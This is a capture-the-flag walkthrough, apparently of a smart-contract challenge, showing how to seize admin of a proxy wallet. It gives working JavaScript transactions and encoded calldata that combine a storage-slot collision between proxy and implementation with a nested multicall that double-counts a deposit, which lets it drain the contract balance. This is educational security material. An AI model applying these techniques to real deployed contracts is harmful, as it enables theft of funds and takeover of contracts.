# Answer

Goal: Become admin of the wallet proxy.

## 1. Identifying proxy

At first glance it may seem, that the `contract` provided in console is the implementation rather than the proxy, since the ABI does not expose any of the proxy methods:

```javascript
abi: Array(10)
0: {type: 'function', name: 'addToWhitelist', inputs: Array(1), outputs: Array(0), stateMutability: 'nonpayable', …}
1: {type: 'function', name: 'balances', inputs: Array(1), outputs: Array(1), stateMutability: 'view', …}
2: {type: 'function', name: 'deposit', inputs: Array(0), outputs: Array(0), stateMutability: 'payable', …}
3: {type: 'function', name: 'execute', inputs: Array(3), outputs: Array(0), stateMutability: 'payable', …}
4: {type: 'function', name: 'init', inputs: Array(1), outputs: Array(0), stateMutability: 'nonpayable', …}
5: {type: 'function', name: 'maxBalance', inputs: Array(0), outputs: Array(1), stateMutability: 'view', …}
6: {type: 'function', name: 'multicall', inputs: Array(1), outputs: Array(0), stateMutability: 'payable', …}
7: {type: 'function', name: 'owner', inputs: Array(0), outputs: Array(1), stateMutability: 'view', …}
8: {type: 'function', name: 'setMaxBalance', inputs: Array(1), outputs: Array(0), stateMutability: 'nonpayable', …}
9: {type: 'function', name: 'whitelisted', inputs: Array(1), outputs: Array(1), stateMutability: 'view', …}
length: 10
```

But if you try to call `proposeNewAdmin()` on the same address, using a transaction object with encoded selector it will succeed. The task mounted the PuzzleWallet ABI on the proxy address.

## 2. Storage vulnerability

The main mistake of these contracts is that PuzzleProxy storage slots of `pendingAdmin` and `admin` overlap with the implementations `owner` and `maxBalance`. This can be exploited because proxies usually use delegateCall to use implementation functions. In this case PuzzleProxy uses it's own storage, but PuzzleWallet function logic.

As mentioned before our end goal is to become `admin` of the PuzzleProxy and because `admin` overlaps with `maxBalance` our goal will also be reached if we set `maxBalance` to our desired address.

## 3. Become owner of the wallet

Do not confuse `owner` of PuzzleWallet and `admin` of PuzzleProxy, these are different variables. Becoming `owner` will help us gain more access to the functionality of PuzzleWallet. We can do this by calling the mentioned `proposeNewAdmin()`, this works because of the the stroage vulnerability and pendingAdmin and owner share the same slot.

```javascript
await sendTransaction({
  to: contract.address,
  from: player,
  data: 'a6376746000000000000000000000000<player address>', // <- proposeNewAdmin selector with address argument
})
```

## 4. Become whitelisted

After becoming the `owners` we can be easily whitelisted using `addToWhitelist()` function.

```javascript
await contract.addToWhitelist(player)
```

## 5. Empty the contract balance

Before we can call `setMaxBalance` we have to workaround the `require(address(this).balance == 0, "Contract balance is not 0");` guard. Means our next step should be to empty the contracts balance - by default it already has 0.001 ETH. We will only be able to do this once we match our own `balances[player addr]` value with the contracts balance and then call `execute()` to transfer all the ethereum away. We can't just use `deposit()`, because our `balances[player addr]` value will always be 0.001 ETH less than the contract's balance. To work around this `deposit()` limitation we exploit the reentrancy vulnerability created in `multicall()`:

```javascript
await contract.multicall(
  [
    '0xd0e30db0',
    '0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000',
  ],
  { value: '1000000000000000' },
)
```

The first argument `0xd0e30db0` is the `deposit()` selector, but we can't use the same selector for the second call because there is an explicit protection implemented with `bool depositCalled`. Fortunately it is only saved in memory, so if we instead wrappred the `0xd0e30db0` selector in another `multicall` the guard will not trigger. The second argument is roughly an encoded `multicall(['<deposit() selector>'])`. And the value is the same value as current contract balance - 0.001 ETH.

After this call `balances[player addr]` will match contract balance and will equal 0.002 ETH. Since the amounts are exactly equal after we call `execute()` with our entire balance the contract will no longer posses any ethereum:

```javascript
await contract.execute(player, '2000000000000000', [])
```

## 6. Become admin of PuzzleProxy

At this point we have worked around all the security and can become `admin` by setting `maxBalance` to our desired address.

```javascript
await contract.setMaxBalance(player)
```
